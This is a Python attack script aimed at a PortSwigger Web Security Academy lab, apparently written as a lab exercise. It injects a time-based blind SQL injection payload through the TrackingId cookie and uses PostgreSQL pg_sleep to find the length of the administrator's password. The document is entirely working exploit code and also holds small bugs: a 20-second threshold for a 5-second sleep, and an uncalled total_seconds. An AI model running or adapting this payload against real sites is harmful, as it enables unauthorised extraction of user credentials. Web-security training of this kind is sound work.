import requests
from colorama import Fore,Style

url = "https://0a5b00b1047de63c80d2212000e8001d.web-security-academy.net/"

def checking(value):
    cookies = {'TrackingId':f"A7lFAHYY2r1EIeeu{value}"}
    response = requests.get(url,cookies=cookies)
    return response.text, response.headers, response.elapsed

for i in range(50):
    payload = f"' AND (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>{i}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)='a'--"
    body,headers,conn = checking(payload)

    if ("Gateway Timeout" in body):
        print(f"{Fore.RED} [-] LAB Expired {body} {Style.RESET_ALL}")
    else:
        if (conn.total_seconds()) > 20:
            print(f"{Fore.GREEN} [+] Response took this amount of time: {conn.total_seconds} and {body} {Style.RESET_ALL}" )
        else:
            print(f"{Fore.RED} [-] Response took {conn.total_seconds} and match not found {Style.RESET_ALL} ")